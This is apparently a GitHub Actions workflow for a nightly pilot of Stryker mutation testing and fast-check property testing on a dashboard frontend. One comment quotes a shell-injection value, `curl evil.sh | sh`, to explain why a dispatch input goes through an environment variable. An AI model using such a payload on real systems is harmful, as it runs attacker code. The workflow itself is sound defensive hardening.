name: Frontend testing pilot

# #3326. A time-boxed pilot of the two checks this repository does not have:
# mutation testing (Stryker) and property testing (fast-check) on the
# dashboard-next frontend's pure logic.
#
# The argument for both is one sentence from the issue: line coverage shows
# code was executed, not that the tests would catch a change to it. A module can
# be at 100% line coverage and every one of its tests can still pass when the
# function is made to return the wrong thing.
#
# This workflow is NOT a gate and must not quietly become one. The issue asks
# for a *decision* on a ratchet based on what the pilot measures; a measurement
# that has already started failing CI has stopped being a measurement. So:
#
#   - the mutation job is `continue-on-error` and nothing anywhere reads its
#     score. It records killed/survived/timeout and uploads the report.
#   - the property job's high-run random-seed pass IS allowed to fail the run,
#     because a counterexample there is a real defect rather than a score. It
#     also opens an issue, since a scheduled run's own red X is not an alert
#     anyone is watching (the #2222 rationale in diagnostics.yml).
#
# What runs in PR CI, and why this file has no `pull_request` trigger: the
# small, fixed-seed property pass already runs there, as part of the plain
# `npm test` in quality.yml's frontend-next pair. The file matches
# vitest.config.ts's own include glob, so it needs no new step, no new install
# and no second run of the same eight assertions. The `property-pr-equivalent`
# step below deliberately repeats that same small seeded pass, so the nightly
# shows both numbers side by side and a drop in the large run can be read
# against the case set PR CI actually gates on.
#
# Cadence note: the crons here are staggered off the repo's existing ones
# (17 */6, */15, */30, 41 * * * *, 23/45 3 * * [1-3]) so this does not pile
# onto an existing slot.

on:
  schedule:
    - cron: "41 4 * * *"
  workflow_dispatch:
    inputs:
      num_runs:
        description: >-
          fast-check runs per property in the large random-seed pass. The
          scheduled default is high because that pass is the search; lower it
          only to reproduce a specific seed faster.
        type: string
        default: "2000"
      mutate:
        description: >-
          Override the mutated file list (Stryker --mutate), e.g.
          src/lib/appearanceCookie.ts. Empty uses stryker.conf.mjs's own list.
        type: string
        default: ""

permissions:
  contents: read

concurrency:
  group: frontend-testing-pilot
  # Not cancellable. A run cancelled halfway has produced no report and no
  # verdict, and the next one is a day away; letting it finish is worth more
  # than the runner-minutes.
  cancel-in-progress: false

jobs:
  # Derived from the image rather than written out, for the reason #3331 exists:
  # a second copy of the node major is a second thing to forget. The pilot runs
  # no built artifact, but it does run the frontend's tests, and a result
  # measured on a runtime the container does not serve is a result about a
  # different program.
  node-runtime:
    name: Node major from the image (#3331)
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs:
      node-version: ${{ steps.node-runtime.outputs.node-version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - name: Node major from the image (#3331)
        id: node-runtime
        run: ./scripts/node-runtime-major.sh arcane/home/honeypot-dashboard/frontend-next/Dockerfile

  property:
    name: Property search (fast-check, high runs, random seed)
    needs: [node-runtime]
    # GitHub-hosted on purpose, and not a pair. The pilot is measurement, not
    # a gate, so there is nothing for a homeserver run to buy and a reason not
    # to spend the box's capacity on it. It also keeps the workflow readable:
    # the routing decision exists in ci-router.yml for checks PRs depend on.
    runs-on: ubuntu-latest
    timeout-minutes: 30
    # Narrower than the workflow default, and deliberately so: this is the only
    # job here that needs to write anything, and issues:write is the one
    # permission in this repository that turns a CI bug into a public write.
    permissions:
      contents: read
      issues: write
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: ${{ needs.node-runtime.outputs.node-version }}
          cache: npm
          cache-dependency-path: arcane/home/honeypot-dashboard/frontend-next/package-lock.json
      - run: npm ci
        working-directory: arcane/home/honeypot-dashboard/frontend-next
      # The PR-CI-equivalent pass, run first and reported on its own so the two
      # numbers can be compared in the same log. Fixed seed, 100 runs, so this
      # is byte-for-byte what `npm test` runs on every PR today.
      - name: Fixed-seed pass (the PR CI case set)
        run: npm run test:property
        working-directory: arcane/home/honeypot-dashboard/frontend-next
      # The search. A different seed every night is the entire point: it is
      # what makes this a search for cases the pinned set does not contain
      # rather than a re-run of the cases it already contains.
      - name: Random-seed pass (high runs)
        env:
          FC_SEED: random
          FC_NUM_RUNS: ${{ inputs.num_runs || '2000' }}
        run: npm run test:property
        working-directory: arcane/home/honeypot-dashboard/frontend-next
      # fast-check shrinks a counterexample to something small enough to paste
      # into an issue, which is why the job fails here rather than swallowing
      # it. This is a real defect, not a score.
      - name: Open an issue on a counterexample
        if: failure()
        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b # v7.1.0
        with:
          script: |
            await github.rest.issues.create({
              owner: context.repo.owner,
              repo: context.repo.repo,
              title: 'Nightly property-test counterexample on the appearance cookie pair (#3326 pilot)',
              body: [
                'fast-check found a counterexample in `arcane/home/honeypot-dashboard/frontend-next/src/lib/appearanceCookie.property.test.ts` with a random seed.',
                '',
                'The run log carries the seed and the shrunk value; paste it into the relevant generator below so the case is pinned for PR CI as well.',
                '',
                'Run: ' + context.serverUrl + '/' + context.repo.owner + '/' + context.repo.repo + '/actions/runs/' + context.runId,
              ].join('\n'),
              labels: ['dashboard'],
            })

  mutation:
    name: Mutation measurement (Stryker, advisory)
    needs: [node-runtime]
    runs-on: ubuntu-latest
    # Measured, not guessed: the two-module pilot run takes a little over two
    # minutes of mutant execution on a 2-core box at concurrency 2, and
    # `npm ci` dominates the rest. 60 leaves room for a cold npm cache and a
    # busy shared runner without letting a wedged run hang until the platform's
    # own six-hour cap.
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: ${{ needs.node-runtime.outputs.node-version }}
          cache: npm
          cache-dependency-path: arcane/home/honeypot-dashboard/frontend-next/package-lock.json
      - run: npm ci
        working-directory: arcane/home/honeypot-dashboard/frontend-next
      # continue-on-error is the "no gate" requirement expressed in the one
      # place it can be. Stryker's own exit code is 1 on a threshold breach
      # (there is no threshold here) and 1 on a crash; both are recorded rather
      # than enforced. Remove this line only together with a decision to gate,
      # and only after #3318 has a coverage baseline to ratchet against.
      - name: Stryker (advisory)
        id: stryker
        continue-on-error: true
        working-directory: arcane/home/honeypot-dashboard/frontend-next
        # `$MUTATE` through the environment, never `${{ inputs.mutate }}` spliced
        # into the script text. A workflow_dispatch input is operator-typed but
        # still attacker-reachable by anyone who can dispatch, and a value like
        # `x'; curl evil.sh | sh; #` is shell code the moment it is interpolated
        # into a run: block -- which is exactly what zizmor's template-injection
        # rule reports, and that rule is BLOCKING in quality.yml (#3314).
        env:
          MUTATE: ${{ inputs.mutate }}
        run: |
          set -euo pipefail
          if [ -n "$MUTATE" ]; then
            npx stryker run --mutate "$MUTATE" 2>&1 | tee stryker.log
          else
            npx stryker run 2>&1 | tee stryker.log
          fi
      # always(), not failure(): the score is the record of what ran, and it is
      # most worth having on the run where the mutants survived. 14 days covers
      # a weekend plus the follow-up, and matches what the rest of the repo
      # keeps for generated evidence.
      - name: Upload the mutation report
        if: always()
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: frontend-mutation-report
          path: |
            arcane/home/honeypot-dashboard/frontend-next/reports/mutation/
            arcane/home/honeypot-dashboard/frontend-next/stryker.log
          if-no-files-found: warn
          retention-days: 14
          overwrite: true
